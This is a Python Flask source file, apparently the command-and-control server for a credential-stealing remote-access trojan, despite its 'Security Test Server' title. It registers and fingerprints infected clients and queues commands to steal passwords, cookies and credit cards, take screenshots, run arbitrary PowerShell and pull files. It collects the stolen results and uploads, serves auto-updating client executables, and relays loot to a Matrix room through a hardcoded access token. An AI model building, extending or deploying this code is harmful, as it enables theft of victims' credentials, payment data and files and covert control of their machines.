from flask import Flask, request, jsonify, send_file
import threading
import time
import json
import requests
from datetime import datetime
import os
import hashlib
import uuid

app = Flask(__name__)

# Configurazione
MATRIX_WEBHOOK = "https://matrix.org/_matrix/client/r0/rooms/!skCsZdyGNtJBgEQDDL:matrix.org/send/m.room.message"
MATRIX_TOKEN = "mat_PBtLmBg36QnnRHbgIxNeG4EPWSIojv_j6MFr2"
CURRENT_VERSION = "1.1.0"  # 🆕 Versione per auto-update

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
        self.commands_queue = {}
        self.client_fingerprints = {}  # 🆕 Fingerprinting
    
    def generate_fingerprint(self, client_data, ip_address):
        """🆕 Genera fingerprint unico per device"""
        fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
        return hashlib.md5(fingerprint_str.encode()).hexdigest()
    
    def add_client(self, client_data, ip_address):
        with self.lock:
            # 🆕 Check se device già esiste
            fingerprint = self.generate_fingerprint(client_data, ip_address)
            
            if fingerprint in self.client_fingerprints:
                # Device già connesso - riusa ID
                client_id = self.client_fingerprints[fingerprint]
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint
                }
                return client_id
            else:
                # Nuovo device
                client_id = self.next_client_id
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint
                }
                self.client_fingerprints[fingerprint] = client_id
                self.next_client_id += 1
                return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                fingerprint = self.clients[client_id].get("fingerprint")
                if fingerprint in self.client_fingerprints:
                    del self.client_fingerprints[fingerprint]
                del self.clients[client_id]
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None

client_manager = ClientManager()

def send_to_matrix(message, data_type="SERVER"):
    try:
        payload = {
            "msgtype": "m.text",
            "body": f"[{data_type}] {message}"
        }
        headers = {
            "Authorization": f"Bearer {MATRIX_TOKEN}",
            "Content-Type": "application/json"
        }
        requests.post(MATRIX_WEBHOOK, json=payload, headers=headers, timeout=10)
    except Exception as e:
        print(f"Matrix error: {e}")

@app.route('/')
def home():
    clients_count = len(client_manager.list_clients())
    return f"""
    <h1>Security Test Server v{CURRENT_VERSION}</h1>
    <p>PythonAnywhere + Matrix</p>
    <p>Client connessi: {clients_count}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/clients">View Clients</a></p>
    """

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
    
    return f'''
    <h2>Admin Control Panel v{CURRENT_VERSION}</h2>
    
    <h3>📋 Comandi Predefiniti</h3>
    <form action="/send_command" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>Command:</label>
        <select name="command">
            <option value="passwords">Get Passwords</option>
            <option value="cookies">Get Cookies</option>
            <option value="cards">Get Credit Cards</option>
            <option value="systeminfo">System Info</option>
            <option value="screenshot">Screenshot</option>
        </select><br><br>
        
        <button type="submit">Send Command</button>
    </form>

    <h3>⚡ PowerShell Live</h3>
    <form action="/send_powershell" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>PowerShell Command:</label><br>
        <textarea name="powershell_command" rows="3" cols="50" placeholder="Enter any PowerShell command..."></textarea><br><br>
        
        <button type="submit">Execute PowerShell</button>
    </form>

    <h3>📁 File Operations</h3>
    <form action="/download_file" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br>
        
        <label>File Path:</label>
        <input type="text" name="file_path" placeholder="C:\path\to\file.txt" style="width: 300px;"><br><br>
        
        <button type="submit">Download File</button>
    </form>

    <p><a href="/clients">View All Clients</a></p>
    '''

@app.route('/send_command', methods=['POST'])
def send_command_web():
    client_id = request.form.get('client_id')
    command = request.form.get('command')
    
    if client_id and command:
        client_manager.add_command(int(client_id), command)
        send_to_matrix(f"🌐 Comando web '{command}' per client {client_id}")
    
    return f'''
    <h3>Command Sent!</h3>
    <p>Command: {command} to Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/send_powershell', methods=['POST'])
def send_powershell():
    """🆕 Endpoint per comandi PowerShell arbitrari"""
    client_id = request.form.get('client_id')
    powershell_command = request.form.get('powershell_command')
    
    if client_id and powershell_command:
        # 🆕 Prefisso per identificare comandi PowerShell live
        command = f"powershell_live:{powershell_command}"
        client_manager.add_command(int(client_id), command)
        send_to_matrix(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")
    
    return f'''
    <h3>PowerShell Command Sent!</h3>
    <p>Command: {powershell_command}</p>
    <p>To Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/download_file', methods=['POST'])
def download_file():
    """🆕 Endpoint per download file da client"""
    client_id = request.form.get('client_id')
    file_path = request.form.get('file_path')
    
    if client_id and file_path:
        command = f"download_file:{file_path}"
        client_manager.add_command(int(client_id), command)
        send_to_matrix(f"📥 Download richiesto: {file_path} da client {client_id}")
    
    return f'''
    <h3>Download Request Sent!</h3>
    <p>File: {file_path}</p>
    <p>From Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

# 🆕 Endpoint per upload file
@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    """Riceve file uploadati dal client"""
    try:
        client_id = request.form.get('client_id')
        file_path = request.form.get('file_path')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file uploaded"})
        
        file = request.files['file']
        safe_filename = os.path.basename(file_path) if file_path else f"upload_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        
        uploads_dir = "uploads"
        os.makedirs(uploads_dir, exist_ok=True)
        
        file.save(os.path.join(uploads_dir, safe_filename))
        
        send_to_matrix(f"📤 File uploadato da client {client_id}: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File {safe_filename} uploaded"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# 🆕 Endpoint per auto-update
@app.route('/api/check_update', methods=['GET'])
def check_update():
    """Client checka se ci sono aggiornamenti"""
    client_version = request.args.get('version', '1.0.0')
    
    if client_version != CURRENT_VERSION:
        return jsonify({
            "status": "update_available",
            "current_version": CURRENT_VERSION,
            "message": "New version available",
            "download_url": f"https://PythonEnjoyer291.eu.pythonanywhere.com/downloads/client_v{CURRENT_VERSION}.exe"
        })
    else:
        return jsonify({
            "status": "up_to_date", 
            "message": "Client is up to date"
        })

# 🆕 Endpoint per download nuovo EXE
@app.route('/downloads/<path:filename>')
def download_exe(filename):
    """Serve il nuovo EXE per l'update"""
    try:
        return send_file(f"downloads/{filename}", as_attachment=True)
    except:
        return "File not found", 404

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        client_data = request.json
        client_ip = request.remote_addr
        client_id = client_manager.add_client(client_data, client_ip)
        
        send_to_matrix(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered successfully"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_commands', methods=['GET'])
def check_commands():
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"})
        
        command = client_manager.get_command(int(client_id))
        
        return jsonify({
            "status": "success",
            "command": command,
            "message": "Command check completed"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        results = data.get('results')
        
        send_to_matrix(f"📊 Risultati da client {client_id} - {command}:\n{str(results)[:500]}...")
        
        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "clients": {
            cid: {
                "data": info["data"],
                "last_seen": info["last_seen"].isoformat(),
                "ip": info["ip"],
                "fingerprint": info.get("fingerprint", "unknown")
            } for cid, info in clients.items()
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # Crea cartelle necessarie
    os.makedirs("uploads", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    
    send_to_matrix(f"🚀 Server Advanced v{CURRENT_VERSION} avviato")
    app.run(host='0.0.0.0', port=port, debug=False)
